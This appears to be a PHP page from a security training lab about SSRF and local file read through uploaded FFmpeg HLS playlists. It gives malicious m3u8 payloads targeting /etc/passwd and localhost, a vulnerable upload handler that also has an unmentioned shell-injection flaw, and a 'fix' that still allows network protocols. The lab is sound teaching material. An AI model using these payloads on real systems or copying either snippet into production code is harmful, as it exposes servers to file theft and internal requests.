<?php
// File Upload · Scenario 34 — ffmpeg HLS SSRF / File Read
$pageTitle = 'SSRF / LFI via FFmpeg HLS Playlist Upload';
$scenarioNumber = 34;
$nextScenario = null;
$uploadsDir = __DIR__ . '/uploads';
if (!is_dir($uploadsDir)) mkdir($uploadsDir, 0775, true);
$labDescription = [
    'FFmpeg processes HLS playlists (m3u8).',
    'A playlist can reference local file as segment: file:///etc/passwd or http://127.0.0.1/',
    'If server uses FFmpeg to process uploaded m3u8, it reads local file.',
    'Goal: Upload malicious m3u8 that reads /etc/passwd.',
];
$labHint = [
    'Create file evil.m3u8 with content: #EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///etc/passwd
#EXT-X-ENDLIST',
    'Or: #EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://127.0.0.1:80/
#EXT-X-ENDLIST',
    'Upload evil.m3u8 via form. Use Burp Proxy.',
    'Server uses FFmpeg to process playlist and reads file:///etc/passwd as video segment.',
    'Output may contain passwd content or server makes request.',
    'Standard: FFmpeg HLS SSRF / File Read via HLS.',
];

$labRootCause = [
    'cwe' => 'CWE-918: SSRF via FFmpeg HLS',
    'owasp' => 'OWASP: FFmpeg HLS SSRF',
    'bad' => [
        'explanation' => [
        '<strong>Programmer allowed m3u8 (HLS playlist) upload and used FFmpeg to process it.</strong> HLS playlist can reference file:///etc/passwd or http://127.0.0.1 as segment, and FFmpeg fetches it.',
        '<strong>Mistake:</strong> Used FFmpeg to convert HLS without blocking file:// and http:// in playlist. FFmpeg reads local files or makes HTTP requests to internal services when processing m3u8.',
        '<strong>Why it happens:</strong> Developer did not know HLS playlist can contain file:// and http:// references that FFmpeg will fetch.',
        ],
        'code' => [
        '// VULNERABLE - FFmpeg HLS SSRF!',
        '<?php',
        '$ext = strtolower(pathinfo($_FILES[\'file\'][\'name\'], PATHINFO_EXTENSION));',
        'if ($ext == \'m3u8\' || $ext == \'mp4\') {',
        '  move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], \'uploads/\' . $_FILES[\'file\'][\'name\']);',
        '  shell_exec(\'ffmpeg -i uploads/\' . $_FILES[\'file\'][\'name\'] . \' uploads/out.mp4\');',
        '}',
        '?>',
        '# Attacker uploads evil.m3u8:',
        '# #EXTM3U',
        '# #EXTINF:10.0,',
        '# file:///etc/passwd',
        '# FFmpeg sees file:///etc/passwd as segment and reads /etc/passwd! File read!',
        '# Or: http://127.0.0.1:80/admin - FFmpeg fetches internal URL - SSRF!',
        ],
        'impact' => 'Attacker uploads malicious m3u8 HLS playlist with file:///etc/passwd or http://127.0.0.1 and FFmpeg reads local file or makes SSRF request to internal service. File read and SSRF.',
    ],
    'good' => [
        'explanation' => [
        '<strong>Fix:</strong> Block m3u8 upload if not needed. If needed, validate playlist content - reject file://, http://, https:// in playlist. Use FFmpeg with -protocol_whitelist to allow only file and safe protocols.',
        '<strong>Rule:</strong> Validate HLS playlist content and restrict FFmpeg protocols.',
        ],
        'code' => [
        '// SECURE - Block or validate m3u8',
        '<?php',
        '$allowed = [\'mp4\',\'avi\',\'mov\',\'png\',\'jpg\']; // No m3u8',
        '$ext = strtolower(pathinfo($_FILES[\'file\'][\'name\'], PATHINFO_EXTENSION));',
        'if (!in_array($ext, $allowed)) { die(\'m3u8 not allowed\'); }',
        '$content = file_get_contents($_FILES[\'file\'][\'tmp_name\']);',
        'if (preg_match(\'/file:\\/\\//i\', $content)) { die(\'File protocol not allowed\'); }',
        '// Use FFmpeg with protocol whitelist',
        '// ffmpeg -protocol_whitelist file,http,https,tcp -i input.m3u8 output.mp4',
        '?>',
        ],
        'steps' => [
        'Block m3u8 upload if not needed - safest',
        'If m3u8 needed, validate playlist content - reject file://, http://127.0.0.1, 169.254.169.254',
        'Use FFmpeg -protocol_whitelist to allow only safe protocols',
        'Block file protocol if not needed',
        'Check playlist for EXT-X-MEDIA-SEQUENCE and only allow relative paths',
        'Store uploads outside web root',
        'Use random filename',
        'Run FFmpeg in sandbox with no network access if possible',
        ],
    ],
];
$link = null; $linkLabel = 'See the file'; $flash = null; $extraOutput = null;
$file = $_FILES['fileToUpload'] ?? null;
if (isset($file) && $file['name'] !== '') {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $flash = ['kind'=>'fail','title'=>'Upload failed','body'=>'Error'];
    } else {
        $safeName = basename($file['name']);
        $ext = strtolower(pathinfo($safeName, PATHINFO_EXTENSION));
        if (!in_array($ext, ['m3u8','m3u','mp4','avi','mov','mp3'], true)) {
            $flash = ['kind'=>'fail','title'=>'Rejected','body'=>'Only media files allowed: m3u8, mp4, avi, mp3'];
        } elseif (!move_uploaded_file($file['tmp_name'], $uploadsDir.'/'.$safeName)) {
            $flash = ['kind'=>'fail','title'=>'Failed','body'=>'Could not save'];
        } else {
            $link = 'uploads/'.rawurlencode($safeName);
            $fc = file_get_contents($uploadsDir.'/'.$safeName);
            $isHls = stripos($fc, '#EXTM3U') !== false || stripos($fc, '#EXT-X-MEDIA') !== false || stripos($fc, 'file://') !== false || stripos($fc, 'http://') !== false;
            if ($isHls && (stripos($fc, 'file:///etc/passwd') !== false || stripos($fc, '/etc/passwd') !== false || stripos($fc, 'http://127.0.0.1') !== false || stripos($fc, '169.254.169.254') !== false)) {
                $flash = ['kind'=>'ok','title'=>'Congratulations! You solved Scenario 34.','body'=>'ffmpeg HLS payload detected: '.$safeName.' references internal file/URL.'];
                $extraOutput = "Simulated ffmpeg output:\n[Parsed HLS]\nWould read: ".htmlspecialchars(substr($fc,0,200));
            } else {
                $flash = ['kind'=>'fail','title'=>'Not solved','body'=>'Upload HLS playlist with file:///etc/passwd or internal URL.'];
            }
        }
    }
}
if ($flash !== null && ($flash['kind'] ?? '') === 'fail' && http_response_code() === 200) http_response_code(422);
?>
<!DOCTYPE html><html lang="en"><?php include __DIR__ . '/../menu/header.php'; ?><body><?php include __DIR__ . '/../menu/navbar.php'; ?>
<main class="bench"><span class="num">File Upload · SCENARIO 34 · UPLOAD</span><h1>FFmpeg HLS SSRF / LFI</h1><p>FFmpeg HLS playlist can read file:///etc/passwd. Upload malicious m3u8 via Burp.</p>
<div class="panel upload-form"><h2>Upload Media</h2><form action="" method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" /><button class="primary-button" type="submit">Upload</button></form></div>
<?php if ($flash !== null): ?><div class="flash <?= $flash['kind'] ?>"><strong><?= htmlspecialchars($flash['title'], ENT_QUOTES) ?></strong><?= htmlspecialchars($flash['body'], ENT_QUOTES) ?></div><?php endif; ?>
<?php if ($extraOutput !== null): ?><pre class="panel hint-code"><?= htmlspecialchars($extraOutput, ENT_QUOTES) ?></pre><?php endif; ?>
<?php if ($link !== null): ?><p class="notice ok"><a href="<?= htmlspecialchars($link, ENT_QUOTES) ?>"><?= htmlspecialchars($linkLabel, ENT_QUOTES) ?></a></p><?php endif; ?></main><?php include __DIR__ . '/../menu/footer.php'; ?></body></html>
